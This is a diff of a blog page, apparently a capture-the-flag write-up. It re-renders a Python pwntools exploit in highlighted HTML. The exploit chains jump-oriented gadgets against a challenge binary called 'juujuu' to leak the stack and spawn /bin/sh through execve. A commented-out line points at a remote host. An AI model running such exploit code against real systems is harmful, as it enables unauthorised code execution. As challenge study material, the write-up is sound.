@@ -3,7 +3,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=17941d18d5e8b6597efd5746996c8d7c1374c9d2">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ad89651c35ce1f15ad2e2c36e337606f693f0ac8">
     <script src="https://kit.fontawesome.com/cad5e6b3e1.js" crossorigin="anonymous"></script>
 
 <!-- Begin Jekyll SEO tag v2.7.1 -->
@@ -157,85 +157,85 @@
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-#0x4000c5 syscall
+<span class="c1">#0x4000c5 syscall
 #offset 2 24
-r = process('./juujuu')
-#gdb.attach(r)
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./juujuu'</span><span class="p">)</span>
+<span class="c1">#gdb.attach(r)
 #r = remote('159.89.45.52', 5555)
-empezando = "/bin/sh\0" #controlamos este registro, rsi
-
-#stage 1
+</span><span class="n">empezando</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span> <span class="c1">#controlamos este registro, rsi
+</span>
+<span class="c1">#stage 1
 #------------------------------------------------------------#
 #construyendo salto atras
-jop = "A" * 24
-#saltando a rsp +8 , [rsp-8]
-jop += p64(0x4000d4)
-jop += p64(0x4000c7)
-#write syscall para hacer un leak del stack
-jop += p64(0x4000fc)
-jop += p64(0x004000b0)
+</span><span class="n">jop</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span>
+<span class="c1">#saltando a rsp +8 , [rsp-8]
+</span><span class="n">jop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000d4</span><span class="p">)</span>
+<span class="n">jop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000c7</span><span class="p">)</span>
+<span class="c1">#write syscall para hacer un leak del stack
+</span><span class="n">jop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000fc</span><span class="p">)</span>
+<span class="n">jop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004000b0</span><span class="p">)</span>
 
-junk = "A" * (cyclic_find('qaac')-len(empezando)-8-len(jop))                        
-payload = empezando                                                               
-payload += jop                                                                      
-payload += junk
+<span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">cyclic_find</span><span class="p">(</span><span class="s">'qaac'</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">empezando</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">jop</span><span class="p">))</span>                        
+<span class="n">payload</span> <span class="o">=</span> <span class="n">empezando</span>                                                               
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">jop</span>                                                                      
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">junk</span>
 
-#seteando [rcx] a dispatcher                                                    
-payload += p64(0x4000d4)                                                   
-payload += p64(0x4000c7)
+<span class="c1">#seteando [rcx] a dispatcher                                                    
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000d4</span><span class="p">)</span>                                                   
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000c7</span><span class="p">)</span>
 
-#[rbp] a dispatcher
-payload += p64(0x00000000004000cf)
+<span class="c1">#[rbp] a dispatcher
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004000cf</span><span class="p">)</span>
 
-#setear r10 a dispatcher, por que si no mas
-payload += p64(0x4000ec)
+<span class="c1">#setear r10 a dispatcher, por que si no mas
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000ec</span><span class="p">)</span>
 
-#mas stack (pivot)                                                      
-payload += p64(0x0000000000400131)#sub rsp 100                                  
-r.sendline(payload)
+<span class="c1">#mas stack (pivot)                                                      
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400131</span><span class="p">)</span><span class="c1">#sub rsp 100                                  
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-#--------------------------------------------------------#
-
-#stage2
+<span class="c1">#--------------------------------------------------------#
+</span>
+<span class="c1">#stage2
 #recibiendo leak del stack
-resp = u64(r.recv(8))
-print "LEAK  STACK  :   ",hex(resp)
+</span><span class="n">resp</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">"LEAK  STACK  :   "</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
 
-#seteando salto atras para syscall final execve()
-jop2 = "A" * 32
-#
-jop2 += p64(0x4000de) #inc RAX
-jop2 += p64(resp)#restaurando rcx
-jop2 += p64(0x4000de) #inc RAX
-jop2 += p64(resp)#restaurando rcx
-jop2 += p64(0x4000de) #inc RAX
-jop2 += p64(resp)#restaurando rcx
-jop2 += p64(0x400108)#add rax 12
-jop2 += p64(0x400108)#add rax 12
-jop2 += p64(0x400108)#add rax 12
-jop2 += p64(0x400125)
-jop2 += p64(resp-0x1c8) #address the bin sh enviada esta 0x1c8 del leak de stack
-jop2 += p64(0x40011b)# xor los otros reg
-jop2 += p64(resp)
-jop2 += p64(0x400101) #syscall
-
-junk = "A" * (cyclic_find('qaac')-len(empezando)-8-len(jop2))                                             
-payload2 = empezando  #/bin/sh                                                               
-payload2 += jop2                                                                     
-payload2 += junk
-#seteando [rcx] a dispatcher                                                   
-payload2 += p64(0x4000d5) #rax a 0x0 y luego a 0x1                                                  
-payload2 += p64(resp)#restaurando rcx
-payload2 += p64(0x4000de) #inc RAX
-payload2 += p64(resp)#restaurando rcx
+<span class="c1">#seteando salto atras para syscall final execve()
+</span><span class="n">jop2</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="c1">#
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000de</span><span class="p">)</span> <span class="c1">#inc RAX
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span><span class="c1">#restaurando rcx
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000de</span><span class="p">)</span> <span class="c1">#inc RAX
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span><span class="c1">#restaurando rcx
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000de</span><span class="p">)</span> <span class="c1">#inc RAX
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span><span class="c1">#restaurando rcx
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400108</span><span class="p">)</span><span class="c1">#add rax 12
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400108</span><span class="p">)</span><span class="c1">#add rax 12
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400108</span><span class="p">)</span><span class="c1">#add rax 12
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400125</span><span class="p">)</span>
+<span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="o">-</span><span class="mh">0x1c8</span><span class="p">)</span> <span class="c1">#address the bin sh enviada esta 0x1c8 del leak de stack
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40011b</span><span class="p">)</span><span class="c1"># xor los otros reg
+</span><span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
+<span class="n">jop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400101</span><span class="p">)</span> <span class="c1">#syscall
+</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">cyclic_find</span><span class="p">(</span><span class="s">'qaac'</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">empezando</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">jop2</span><span class="p">))</span>                                             
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">empezando</span>  <span class="c1">#/bin/sh                                                               
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">jop2</span>                                                                     
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">junk</span>
+<span class="c1">#seteando [rcx] a dispatcher                                                   
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000d5</span><span class="p">)</span> <span class="c1">#rax a 0x0 y luego a 0x1                                                  
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span><span class="c1">#restaurando rcx
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000de</span><span class="p">)</span> <span class="c1">#inc RAX
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span><span class="c1">#restaurando rcx
 #ganando stack
-payload2 += p64(0x0000000000400131)#sub rsp 100                                            
-r.sendline(payload2)
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400131</span><span class="p">)</span><span class="c1">#sub rsp 100                                            
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
 
-r.interactive()
-</code></pre>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
 <!-- /wp:code -->
 
                 </section>
